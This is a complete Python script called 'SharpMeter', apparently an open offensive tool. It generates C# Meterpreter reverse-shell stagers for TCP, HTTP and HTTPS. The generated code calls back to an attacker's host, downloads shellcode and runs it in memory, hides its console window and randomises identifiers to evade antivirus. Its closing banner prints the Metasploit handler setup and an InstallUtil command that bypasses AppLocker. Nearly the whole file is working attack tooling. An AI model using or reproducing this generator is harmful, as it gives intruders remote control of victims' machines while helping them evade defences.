#!/usr/bin/python
import random
import sys

DEBUG = False
XOR_URL = False
VALIDATE_SSL_CERT = False # Try letsencrypt.org and afraid.org!
APP_LOCKER = True

def opening_banner():
    ret ='''
 ____  _                      __  __      _
/ ___|| |__   __ _ _ __ _ __ |  \/  | ___| |_ ___ _ __
\___ \| '_ \ / _` | '__| '_ \| |\/| |/ _ \ __/ _ \ '__|
 ___) | | | | (_| | |  | |_) | |  | |  __/ ||  __/ |
|____/|_| |_|\__,_|_|  | .__/|_|  |_|\___|\__\___|_|
                       |_|              by @vvalien1
'''
    return ret

def finish_banner():
    ret ="""
[*] On Your Metasploit Host Run:
--------------------------------
use exploit/multi/handler
set payload windows/meterpreter/reverse_{0}
set LHOST 0.0.0.0
set LPORT {1}
set ExitOnSession false
set EnableStageEncoding true
set EnableUnicodeEncoding true
exploit -j

[*] On Windows To Compile:
--------------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"{2}.exe" /platform:x86 "{2}.cs"

[*] To Bypass Applocker:
--------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U "{2}.exe"
"""
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()

def rand_str():
    ascii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rng = random.randrange(10,15) # you can change this
    ret = ''.join(random.choice(ascii) for x in range(rng))
    return ret

def random_names(mod_name = ""):
    ret = rand_str()
    if DEBUG and mod_name != "": ret = mod_name
    return ret

def xor_to_format_bytes(url_name, byte_name, xor_key):
    out_scode = []
    for i in range(len(url_name)):
        out_scode.append(ord(url_name[i]) ^ xor_key)
    byte_string = "byte[] %s = {" % byte_name
    for i in range(len(out_scode)):
        byte_string += hex(out_scode[i])
        if i < len(out_scode)-1 : byte_string += ","
    byte_string += "};"
    return byte_string

def generate_http_https(LHOST, LPORT, SSL):
    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
    namespace = random_names("NameSpaceName")
    classname = random_names("ClassName")
    if APP_LOCKER:
        payloadCode += "namespace %s {" % namespace
        payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
        payloadCode += "public class InstallUtil : System.Configuration.Install.Installer{\n"
        payloadCode += "public override void Install(System.Collections.IDictionary savedState)\n"
        payloadCode += "{Random %s = new Random((int)DateTime.Now.Ticks);}\n" % random_names("NoFunction")
        payloadCode += "public override void Uninstall(System.Collections.IDictionary savedState){%s.Main();}}\n" % classname
        payloadCode += "class %s {\n" % classname
    else:
        payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
    # code for the randomString() function
    randomStringName = random_names("RandomStringName")
    bufferName = random_names("BufferName")
    charsName = random_names("CharsName")
    t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
    random.shuffle(t)
    chars = ''.join(t)
    if SSL and not VALIDATE_SSL_CERT:
        # logic to turn off certificate validation
        validateServerCertficateName = random_names("validateServerCertficateName")
        payloadCode += "private static bool %s(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }\n" %(validateServerCertficateName)
    payloadCode += "static string %s(Random r, int s) {\n" %(randomStringName)
    payloadCode += "char[] %s = new char[s];\n"%(bufferName)
    payloadCode += "string %s = \"%s\";\n" %(charsName, chars)
    payloadCode += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
    payloadCode += "return new string(%s);}\n" %(bufferName)
    # code for the checksum8() function
    checksum8Name = random_names("CheckSum8")
    payloadCode += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)
    # code for the genHTTPChecksum() function
    genHTTPChecksumName = random_names("GenerateHTTPChecksum")
    baseStringName = random_names("BaseStringName")
    randCharsName = random_names("RandomCharsName")
    urlName = random_names("URLName")
    randomReturn = random_names("randomReturnName")
    random.shuffle(t)
    randChars = ''.join(t)
    payloadCode += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
    payloadCode += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
    payloadCode += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
    payloadCode += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
    payloadCode += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
    payloadCode += "if (%s(%s)) {return %s;}}} return \"%s\";}"%(checksum8Name,urlName, urlName, randomReturn) # what was this for???
    # for xoring the url...
    genxorName = random_names("GenXorName")
    genxorByteVar = random_names("GenXorByteVar")
    genxorKeyVar = random_names("GenXorKeyVar")
    genxorReturnChar = random_names("GenXorReturnChar")
    if XOR_URL:
        payloadCode += "\nstatic string %s(byte[] %s, byte %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
        payloadCode += "char[] %s = new char[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
        payloadCode += "for (int i=0; i < %s.Length; i++) { %s[i] = (char)(%s[i] ^ %s); }\n" % (genxorByteVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
        payloadCode += "return new string(%s);}\n" % genxorReturnChar
    # code for getData() function
    getDataName = random_names("GetDataName")
    strName = random_names("StringName")
    webClientName = random_names("WebClientName")
    sName = random_names("sName")
    payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
    if SSL and not VALIDATE_SSL_CERT:
        payloadCode += "ServicePointManager.ServerCertificateValidationCallback = %s;\n" %(validateServerCertficateName)
    payloadCode += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
    payloadCode += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
    payloadCode += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
    payloadCode += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
    payloadCode += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
    payloadCode += "byte[] %s = null;\n" %(sName)
    payloadCode += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
    payloadCode += "if (%s.Length < 100000) return null;}\n" %(sName)
    payloadCode += "catch (WebException) {}\n"
    payloadCode += "return %s;}\n" %(sName)
    # code for the inject() function
    injectName = random_names("injectName")
    sName = random_names("SecondSName")
    funcAddrName = random_names("FunctionAddressName")
    hThreadName = random_names("hThreadName")
    threadIdName = random_names("tThreadName")
    pinfoName = random_names("pInfoName")
    payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
    payloadCode += "if (%s != null) {\n" %(sName)
    payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
    payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
    payloadCode += "IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
    payloadCode += "UInt32 %s = 0;\n" %(threadIdName)
    payloadCode += "IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
    payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
    payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
    # code for Main() to launch everything
    sName = random_names("sName3")
    randomName = random_names("RandomName")
    consoleWin = random_names("ConsoleWindowVariable")
    payloadCode += "public static void Main(){\n"
    payloadCode += "IntPtr %s = GetConsoleWindow();\nShowWindow(%s, 0);\n" %(consoleWin, consoleWin)
    payloadCode += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
    # using ssl or not?
    urlFormat = "http"
    if SSL: urlFormat = "https"
    thexorKey = random.randrange(0,255)
    urlStringName = random_names("UrlStringName")
    xorUrlBytesName = random_names("xorUrlBytes")
    if XOR_URL:
        our_url = "%s://%s:%s/" % (urlFormat, LHOST,LPORT)
        payloadCode += xor_to_format_bytes(our_url, xorUrlBytesName, thexorKey)
        payloadCode += "\nstring %s = %s(%s, %s);" % (urlStringName, genxorName, xorUrlBytesName, thexorKey)
        payloadCode += "\nbyte[] %s = %s( %s + %s(%s));\n" %(sName, getDataName, urlStringName, genHTTPChecksumName,randomName)
    else:
        payloadCode += "byte[] %s = %s(\"%s://%s:%s/\" + %s(%s));\n" %(sName, getDataName, urlFormat, LHOST,LPORT, genHTTPChecksumName,randomName)
    payloadCode += "%s(%s);}\n" %(injectName, sName)
    r = [random_names() for x in xrange(14)]# added in GetConsoleWindow and ShowWindow
    payloadCode += """[DllImport(\"kernel32\")] private static extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr %s, int %s);\n[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11],r[12],r[13])
    return payloadCode

def generate_tcp(LHOST, LPORT):
    getDataName = random_names("GetData")
    injectName = random_names("InjectName")
    payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
    namespace = random_names("NameSpaceName")
    classname = random_names("ClassName")
    if APP_LOCKER:
        payloadCode += "namespace %s {" % namespace
        payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
        payloadCode += "public class InstallUtil : System.Configuration.Install.Installer{\n"
        payloadCode += "public override void Install(System.Collections.IDictionary savedState)\n"
        payloadCode += "{Random %s = new Random((int)DateTime.Now.Ticks);}\n" % random_names("NoFunction")
        payloadCode += "public override void Uninstall(System.Collections.IDictionary savedState){%s.Main();}}\n" % classname
        payloadCode += "class %s {\n" % classname
    else:
        payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
    hostName = random_names("HostName")
    portName = random_names("PortName")
    ipName = random_names("IPName")
    sockName = random_names("SockName")
    length_rawName = random_names("RawLengthName")
    lengthName = random_names("LengthName")
    sName = random_names("sName")
    total_bytesName = random_names("TotalBytesName")
    handleName = random_names("HandleName")
    payloadCode += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
    payloadCode += " IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
    payloadCode += " Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
    payloadCode += " try { %s.Connect(%s); }\n" %(sockName, ipName)
    payloadCode += " catch { return null;}\n"
    payloadCode += " byte[] %s = new byte[4];\n" %(length_rawName)
    payloadCode += " %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
    payloadCode += " int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
    payloadCode += " byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
    payloadCode += " int %s = 0;\n" %(total_bytesName)
    payloadCode += " while (%s < %s)\n" %(total_bytesName, lengthName)
    payloadCode += " { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
    payloadCode += " byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
    payloadCode += " Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
    payloadCode += " return %s;}\n" %(sName)
    sName = random_names("newSname")
    funcAddrName = random_names("FunctionAddressName")
    hThreadName = random_names("HThreadIDName")
    threadIdName = random_names("ThreadIDName")
    pinfoName = random_names("pInfoName")
    payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
    payloadCode += "if (%s != null) {\n" %(sName)
    payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
    payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
    payloadCode += "IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
    payloadCode += "UInt32 %s = 0;\n" %(threadIdName)
    payloadCode += "IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
    payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
    payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)
    sName = random_names()
    consoleWin = random_names("ConsoleWindowVariable")
    payloadCode += "public static void Main(){\n"
    payloadCode += "IntPtr %s = GetConsoleWindow();\nShowWindow(%s, 0);\n" %(consoleWin, consoleWin)
    payloadCode += "byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName,LHOST,LPORT)
    payloadCode += "%s(%s); }\n" %(injectName, sName)
    r = [random_names() for x in xrange(14)] # added in GetConsoleWindow and ShowWindow
    payloadCode += """[DllImport(\"kernel32\")] private static extern IntPtr GetConsoleWindow();\n[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr %s, int %s);\n[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11],r[12],r[13])
    return payloadCode


if __name__ == '__main__':
    if len(sys.argv) < 5:
        print(opening_banner())
        print("\nA Simple Way To Make Meterpreter Reverse Payloads\n")
        print("%s <LHOST> <LPORT> <CompileMe.cs> <tcp/http/https>\n" % sys.argv[0])
        sys.exit(0)
    if len(sys.argv) == 6:
        if sys.argv[5] == "debug": DEBUG = True
    LHOST = sys.argv[1]
    LPORT = int(sys.argv[2])
    output_file = sys.argv[3]
    reverse_method = sys.argv[4]
    if reverse_method == "tcp":
        payload = generate_tcp(LHOST,LPORT)
        write_file(output_file, payload)
    elif reverse_method == "http":
        payload = generate_http_https(LHOST, LPORT, False)
        write_file(output_file, payload)
    elif reverse_method == "https":
        payload = generate_http_https(LHOST, LPORT, True)
        write_file(output_file, payload)
    else:
        print("Please choose a valid connect back method!")
        print("I.E. tcp, http, or https \n")
        sys.exit(0)
    closing = finish_banner().format(reverse_method, LPORT, sys.argv[3].split('.')[0])
    print(closing)
